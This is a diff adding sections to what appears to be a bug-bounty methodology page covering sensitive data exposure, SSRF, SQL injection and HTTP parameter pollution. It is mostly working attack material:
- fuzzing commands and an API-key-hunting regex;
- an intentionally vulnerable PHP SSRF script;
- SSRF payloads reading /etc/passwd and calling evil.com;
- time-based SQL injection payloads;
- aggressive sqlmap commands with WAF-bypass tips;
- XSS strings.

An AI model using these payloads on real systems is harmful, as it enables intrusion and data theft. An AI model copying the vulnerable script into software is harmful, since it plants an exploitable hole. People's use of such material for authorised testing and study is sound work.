@@ -1401,6 +1401,384 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle
         </ul>
     </div>
 </div>
+            
+
+<!-- Sensitive Data Exposure Category -->
+<div class="category">
+    <h3><input type="checkbox" id="sensitive-data-exposure">14 > Sensitive Data Exposure</h3>
+    <div class="subcategory">
+        <h4>What is Sensitive Data Exposure</h4>
+        <p>Information disclosure, also known as information leakage, is when a website unintentionally reveals sensitive information to its users. Depending on the context, websites may leak all kinds of information to a potential attacker, including:</p>
+        <ul>
+            <li>Backup and Config Files Data</li>
+            <li>API Tokens</li>
+            <li>Technical details about the website and its infrastructure</li>
+        </ul>
+        <p>The dangers of leaking sensitive user or business data are fairly obvious, but disclosing technical information can sometimes be just as serious. Although some of this information will be of limited use, it can potentially be a starting point for exposing an additional attack surface, which may contain other interesting vulnerabilities. The knowledge that you are able to gather could even provide the missing piece of the puzzle when trying to construct complex, high-severity attacks.</p>
+        <p>Occasionally, sensitive information might be carelessly leaked to users who are simply browsing the website in a normal fashion. More commonly, however, an attacker needs to elicit the information disclosure by interacting with the website in unexpected or malicious ways. They will then carefully study the website's responses to try and identify interesting behavior.</p>
+
+        <h4>API Key Disclosure - Hunting</h4>
+        <p>Hunting with Burp Suite</p>
+        <ul>
+            <li>Install <a href="https://github.com/PortSwigger/logger-plus-plus">Logger++</a> Extension</li>
+            <li>Paste the following regex in Filter Field:
+                <pre>Response.Body == /(?i)([a-z0-9]+){0,}((_|-){0,}(\\s){0,})(APIkey|secret|accesstoken|apiToken|localhost)(\\s){0,}(=|:|is|>){1,}/ AND Response.Headers CONTAINS "application/javascript"</pre>
+            </li>
+        </ul>
+
+        <h4>Backup Files - Fuzzing</h4>
+        <ul>
+            <li><a href="https://github.com/ffuf/ffuf">FFUF</a> and cyspadSniper Wordlist
+                <pre>ffuf -u https://target.com/FUZZ -w cyspadSniper.txt -mc 200</pre>
+            </li>
+            <li><a href="https://github.com/musana/fuzzuli">FUZZULI</a>
+                <pre>echo https://target.com|fuzzuli -mt all -w 32 -ex .rar,.zip,.tar,.gzip,.backup,.bak -p</pre>
+            </li>
+        </ul>
+
+        <h4>References:</h4>
+        <ul>
+        	<li>check cyspadSniper Wordlist</li>
+            <li><a href="https://portswigger.net/web-security/information-disclosure">PortSwigger Information Disclosure</a></li>
+        </ul>
+    </div>
+</div>
+<!-- SSRF Category -->
+<div class="category">
+    <h3><input type="checkbox" id="ssrf">15 > Server Side Request Forgery (SSRF)</h3>
+    <div class="subcategory">
+        <h4>Overview</h4>
+        <p>Server Side Request Forgery (SSRF) is an attack where the server makes a request (acts like a proxy) to a local or remote source and returns a response containing the data from the request. This is similar to using a proxy or VPN, where the user makes a request to a resource, and the proxy or VPN server fetches and returns the results to the user.</p>
+        <p>With SSRF, various actions can be performed, such as:</p>
+        <ul>
+            <li>Local/Remote Port Scan</li>
+            <li>Reading a Local File (using file://)</li>
+            <li>Sensitive Data Disclosure (e.g., Server IP behind WAF)</li>
+            <li>Interacting with internal apps/services/network (e.g., http://localhost/admin or http://192.168.1.100/admin)</li>
+            <li>RCE by chaining services on the internal network</li>
+            <li>Reading Metadata from Cloud Providers (e.g., AWS, Azure, Google Cloud, Digital Ocean)</li>
+            <li>Reflected XSS/CSRF</li>
+        </ul>
+
+        <h4>Lab Setup</h4>
+        <p>For the lab in this post, use the simple script below, which will be deployed on Digital Ocean:</p>
+        <pre><code>&lt;?php
+    $url = $_GET['url'];
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
+    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
+    $data = curl_exec($curl);
+    if (curl_error($curl)) {
+        echo curl_error($curl);
+    } else {
+        echo "&lt;pre&gt;" . $data . "&lt;/pre&gt;";
+    }
+    curl_close($curl);
+?&gt;</code></pre>
+        <p>cURL was chosen for this blog post because it supports various protocols, making it suitable for learning purposes. A requestster is a function or library used to fetch or request a resource from an input URL.</p>
+
+        <h4>Local/Remote Port Scanning</h4>
+        <p>Port scanning maps running applications/services behind a port to identify what is running. This helps if an attacker wants to interact with internal applications/services.</p>
+        <p>Payload examples:</p>
+        <pre><code>vulnerablesite.com/file/?url=http://127.0.0.1:22
+vulnerablesite.com/file/?url=http://127.0.0.1:port
+vulnerablesite.com/file/?url=http://localhost:port
+vulnerablesite.com/file/?url=https://127.0.0.1:port
+vulnerablesite.com/file/?url=https://localhost:port
+vulnerablesite.com/file/?url=http://[::]:port
+vulnerablesite.com/file/?url=http://0000::1:port</code></pre>
+        <p>Indicators of open or closed ports can include content length, response time, or HTTP status codes.</p>
+
+        <h4>Local File Read</h4>
+        <p>To access local files using SSRF, the `file:///` protocol is used. If the requestster supports it, access can be made to local files.</p>
+        <p>Payload examples:</p>
+        <pre><code>vulnerablesite.com/file/?url=file:///etc/passwd
+vulnerablesite.com/file/?url=file://path/to/file
+vulnerablesite.com/file/?url=file://\/\/etc/passwd
+vulnerablesite.com/file/?url=file:///C:/Windows/win.ini</code></pre>
+        <p>For Windows Server deployments, use `file:///d:/hello.txt`.</p>
+
+        <h4>Sensitive Data Disclosure</h4>
+        <p>When the server connects to a malicious server, you can obtain server logs and find sensitive information such as the server's IP. Using the server as a proxy or VPN is also possible.</p>
+        <pre><code>vulnerablesite.com/file/?url=http://evil.com
+vulnerablesite.com/file/?url=https://evil.com
+vulnerablesite.com/file/?url=http://Burpcollab
+vulnerablesite.com/file/?url=http://clmppw.dnslog.cn</code></pre>
+        <p>Fetch files with malicious payloads from external sites:</p>
+        <pre><code>vulnerablesite.com/file/?url=http://brutelogic.com.br/poc.svg</code></pre>
+
+        <h4>Bypassing SSRF Filters</h4>
+        <p>Whitelists are generally stricter than blacklists. Bypass them by finding open redirects or exploiting poorly implemented regex in whitelists. Use subdomains or directories in whitelisted domains.</p>
+
+        <h4>Bypassing SSRF Filters via Open Redirection</h4>
+        <p>If an open redirection vulnerability exists, you can use it to redirect requests to internal URLs. Check if the application handles redirects or filters them poorly.</p>
+
+        <h4>References:</h4>
+        <ul>
+            <li><a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Exploiting Redis via HTTP Requests</a></li>
+            <li><a href="https://maxchadwick.xyz/blog/ssrf-exploits-against-redis">Exploiting Redis</a></li>
+            <li><a href="https://smarx.com/posts/2020/09/ssrf-to-redis-ctf-solution/">SSRF to Redis CTF Solution</a></li>
+            <li><a href="https://www.fatalerrors.org/a/learning-ssrf-through-ctfhub.html">Learning SSRF through CTFHub</a></li>
+            <li><a href="https://www.fatalerrors.org/a/0t511To.html">SSRF Exploitation</a></li>
+            <li><a href="https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html">Exploiting MySQL via SSRF</a></li>
+        </ul>
+    </div>
+</div>
+
+            <!-- SQL Injection Vulnerabilities Category -->
+<div class="category">
+    <h3><input type="checkbox" id="sql-injection-vulnerabilities">16 > SQL Injection Vulnerabilities</h3>
+    <div class="subcategory">
+        <h4>How to Find SQL Injection Vulnerabilities</h4>
+
+        <h4>1) Logical Operation</h4>
+        <p>One of the best ways to confirm an SQL injection is by making it operate a logical operation and having the expected results. For example: if the GET parameter <code>?username=Peter</code> returns the same content as <code>?username=Peter'</code> or <code>?username=Peter+'1'='1</code>, then you have found an SQL injection.</p>
+
+        <h4>2) Time-Based SQL Injection</h4>
+        <p>Most relative places for injecting SQL payloads as [POST Request] are in Login page (username parameter), Forget password page (username parameter), and Signup Page (first name and last name).</p>
+        
+        <h5>Payloads:</h5>
+        <pre>
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+(SlEeP%09(14-(5-2)))
+')) or sleep(5)=' 
+' WAITFOR DELAY '0:0:5'-- 
+;waitfor delay '0:0:5'-- 
+);waitfor delay '0:0:5'-- 
+';waitfor delay '0:0:5'-- 
+";waitfor delay '0:0:5'-- 
+');waitfor delay '0:0:5'-- 
+");waitfor delay '0:0:5'-- 
+));waitfor delay '0:0:5'-- 
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z%20=%3E
+0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
+        </pre>
+
+        <img src="https://user-images.githubusercontent.com/63053441/155585150-722a2ec2-787d-42bd-85d7-30c6401f8031.png" alt="SQL Injection Payloads">
+
+        <h4>How To Test?</h4>
+        <ol>
+            <li>Use this <a href="https://raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL%20injection/SQL.txt">wordlist</a> with intruder and inject all payloads in relative parameters and headers (User-Agent, Cookies, Referer, x-requested-with, etc.).</li>
+            <li>After you get a DELAY, save the request in a .txt file and use sqlmap to confirm and exploit the vulnerability:
+                <pre>
+sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
+sqlmap -r txt -p user --force-ssl --level 5 --risk 3
+sqlmap -r request.txt -p email/username --force-ssl --level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
+                </pre>
+            </li>
+            <li>Sometimes you can’t exploit because most modern web apps use WAF and user input validation. You can try:
+                <ul>
+                    <li>Changing the request from POST to GET or vice versa.</li>
+                    <li>Using <code>--random-agent</code>.</li>
+                </ul>
+            </li>
+        </ol>
+
+        <h4>3) File Uploaders SQLi</h4>
+        <p>Save the file with these names and upload it to the site:</p>
+        <pre>
+--sleep(15).png
+--sleep(6*3).png
+--sleep(25).png
+--sleep(5*7).png
+pic.png;waitfor delay '0:0:5'-- 
+        </pre>
+
+        <h4>References:</h4>
+        
+        <ul>
+        <li>SQL.txt is in download</li>
+            <li><a href="https://twitter.com/GodfatherOrwa">Twitter - GodfatherOrwa</a></li>
+        </ul>
+    </div>
+</div>
+
+        <!-- Parameter Pollution Category -->
+<div class="category">
+    <h3><input type="checkbox" id="parameter-pollution">16 > Parameter Pollution</h3>
+    <div class="subcategory">
+        <h4>Anatomy of Parameter Pollution</h4>
+        <p>The manipulation of the value of each parameter depends on how each web technology is parsing these parameters. Some web technologies parse the first or the last occurrence of the parameter, some concatenate all the inputs and others will create an array of parameters.</p>
+
+        <p align="center">
+            <img 
+                width="600"
+                height="700"
+                src="https://user-images.githubusercontent.com/63053441/159308061-dd00ec1d-bc07-406f-9e19-7a654ff4af54.png"
+                alt="Parameter Pollution Anatomy"
+            >
+        </p>
+
+        <h4>1 - All Occurrences of Specific Parameter</h4>
+        <p>This means that if we parse the same name parameters like <code>q=hello&q=”><svg/onload=alert(1)></code> the check will be performed on both the parameters because they have the same name. In All occurrences, the barrier is if the back-end logic is configured to allow a specific parameter only 1 time then appending another parameter (e.g., <code>q=hello&q=”><svg/onload=alert(1)></code>) of the same name will give you an error.</p>
+        
+        <h5>Request:</h5>
+        <pre>
+POST /details HTTP/1.1
+Host: site.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+
+id=100&id=101
+        </pre>
+
+        <h5>Response:</h5>
+        <pre>
+HTTP/1.1 403
+server: nginx
+content-type: application/json
+cache-control: no-cache, private
+        </pre>
+
+        <h5>HTTP Parameter Pollution Request:</h5>
+        <pre>
+POST /details HTTP/1.1
+Host: site.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+
+id=100,101
+        </pre>
+
+        <h5>HTTP Parameter Pollution Response:</h5>
+        <pre>
+HTTP/1.1 200 OK
+server: nginx
+content-type: application/json
+cache-control: no-cache, private
+
+{
+    "email":"yourmail@gmail.com",
+    "phoneNumber":+91-9999999999,
+    "email":"victim@gmail.com",
+    "phoneNumber":+91-8888888888
+}
+        </pre>
+
+        <h4>2 - First Occurrence</h4>
+        <p>First occurrence means a web application performs input validation on the first parameter which makes it vulnerable to the second parameter, which should be of the same name.</p>
+        
+        <h5>Request:</h5>
+        <pre>
+GET /search?q="><svg/onload=alert(1)> HTTP/1.1
+Host: site.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+        </pre>
+
+        <h5>Response:</h5>
+        <pre>
+HTTP/1.1 403 Forbidden
+server: nginx
+content-type: application/json
+cache-control: no-cache, private
+        </pre>
+
+        <h5>HTTP Parameter Pollution Request:</h5>
+        <pre>
+GET /search?q=Hello&q="><svg/onload=alert(1)> HTTP/1.1
+Host: site.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+        </pre>
+
+        <h5>HTTP Parameter Pollution Response:</h5>
+        <pre>
+HTTP/1.1 200 OK
+server: nginx
+content-type: application/json
+cache-control: no-cache, private
+        </pre>
+        <p>In the above mentioned polluted request only the first occurrence (<code>q=Hello</code>) is checked and the last occurrence (<code>q="><svg/onload=alert(1)></code>) is not sanitized, which means it will trigger XSS.</p>
+
+        <h4>3 - Last Occurrence</h4>
+        <p>Last occurrence means a web application performs input validation on the last parameter which makes it vulnerable to the first parameter which should be of the same name.</p>
+        
+        <h5>Request:</h5>
+        <pre>
+GET /search?q="><svg/onload=alert(1)> HTTP/1.1
+Host: site.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+        </pre>
+
+        <h5>Response:</h5>
+        <pre>
+HTTP/1.1 403 Forbidden
+server: nginx
+content-type: application/json
+cache-control: no-cache, private
+        </pre>
+
+        <h5>HTTP Parameter Pollution Request:</h5>
+        <pre>
+GET /search?q="><svg/onload=alert(1)>&q=Hello HTTP/1.1
+Host: site.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+        </pre>
+
+        <h5>HTTP Parameter Pollution Response:</h5>
+        <pre>
+HTTP/1.1 200 OK
+server: nginx
+content-type: application/json
+cache-control: no-cache, private
+        </pre>
+        <p>In the above mentioned polluted request only the last occurrence (<code>q=Hello</code>) is checked and the first occurrence (<code>q="><svg/onload=alert(1)></code>) is not sanitized, which means it will trigger XSS.</p>
+
+        <h4>4 - Becomes an Array</h4>
+        <p>Becomes an array means whatever the input is sent from the client side the server parses it into an array and displays it. This means the parameter which you are polluting has an array datatype, which is also the most vulnerable.</p>
+        
+        <h5>Request:</h5>
+        <pre>
+POST /details HTTP/1.1
+Host: site.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+
+id=100
+        </pre>
+
+        <h5>Response:</h5>
+        <pre>
+HTTP/1.1 200 OK
+server: nginx
+content-type: application/json
+cache-control: no-cache, private
+
+{
+    "email":["yourmail@gmail.com"],
+    "phoneNumber":[+91-9999999999]
+}
+        </pre>
+
+        <h5>HTTP Parameter Pollution Request:</h5>
+        <pre>
+POST /details HTTP/1.1
+Host: site.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+
+id=100&id=101
+        </pre>
+
+        <h5>HTTP Parameter Pollution Response:</h5>
+        <pre>
+HTTP/1.1 200 OK
+server: nginx
+content-type: application/json
+cache-control: no-cache, private
+
+{
+    "email":["yourmail@gmail.com","victim@gmail.com"],
+    "phoneNumber":[+91-9999999999,+91-8888888888]
+}
+        </pre>
+
+        <h4>References:</h4>
+        <ul>
+            <li><a href="https://shahjerry33.medium.com/parameter-pollution-zero-day-3feb86ee8a02">Parameter Pollution Zero Day</a></li>
+        </ul>
+    </div>
+</div>
+
+
 
         
     </main>
